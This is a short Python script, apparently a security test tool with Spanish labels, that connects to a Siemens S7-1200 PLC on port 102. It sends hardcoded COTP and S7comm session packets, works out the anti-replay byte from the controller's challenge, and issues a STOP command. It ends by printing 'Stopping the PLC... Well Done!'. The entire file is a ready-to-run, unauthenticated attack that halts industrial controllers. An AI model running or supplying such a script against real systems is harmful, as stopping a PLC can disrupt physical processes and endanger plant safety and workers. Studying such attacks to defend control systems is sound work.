
import socket, time, argparse

parser = argparse.ArgumentParser(prog='clien_socket.py',
                                description=' [+] Prueba S7-1200 v2.2',
                                epilog='[+] Demo: python client_socket.py --host 192.168.1.100 ')

parser.add_argument('--host',   dest="HOST",    help='Host',    required=True)
args = parser.parse_args()

def enviar(payload, con):
    con.send(bytearray.fromhex(payload))
    data = con.recv(1024)
    return data

def main():

    COTP_RQ = '030000231ee00000006400c1020600c20f53494d415449432d524f4f542d4553c0010a'
    #LENGTH 89

    S7_COMM_RQ = '030000ee02f080720100df31000004ca0000000100000120360000011d00040000000000a1000000d3821f0000a3816900151553657276657253657373696f6e5f31433943333846a38221001532302e302e302e303a305265616c74656b20555342204762452046616d696c7920436f6e74726f6c6c65722e54435049502e33a38228001500a38229001500a3822a0015194445534b544f502d494e414d4455385f313432323331343036a3822b000401a3822c001201c9c38fa3822d001500a1000000d3817f0000a38169001515537562736372697074696f6e436f6e7461696e6572a2a20000000072010000'
    #LENGTH 292

    S7_COMM_ANTI = '0300008f02f08072020080310000054200000002000003b834000003b8010182320100170000013a823b00048200823c00048140823d00048480c040823e00048480c040823f001500824000151a313b36455337203231342d31414533302d305842303b56322e328241000300030000000004e88969001200000000896a001300896b000400000000000072020000'
    #LENGTH 197

    STOP7 = '0300004302f0807202003431000004f200000010000003ca3400000034019077000801000004e88969001200000000896a001300896b00040000000000000072020000'
    #LENGTH 121

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((args.HOST, 102))

    data = enviar(COTP_RQ, s)

    data = enviar(S7_COMM_RQ, s)

    challenge = data.hex()[48:50]

    anti = int(challenge, 16) + int("80", 16)

    S7_COMM_ANTI = S7_COMM_ANTI[:46] + hex(anti)[2] + S7_COMM_ANTI[47:]
    S7_COMM_ANTI = S7_COMM_ANTI[:47] + hex(anti)[3] + S7_COMM_ANTI[48:]

    STOP7 = STOP7[:46] + hex(anti)[2] + STOP7[47:]
    STOP7 = STOP7[:47] + hex(anti)[3] + STOP7[48:]

    data = enviar(S7_COMM_ANTI, s)

    data = enviar(STOP7, s)
    print("Stopping the PLC... Well Done!")

    s.close()

if __name__ == "__main__":
    main()
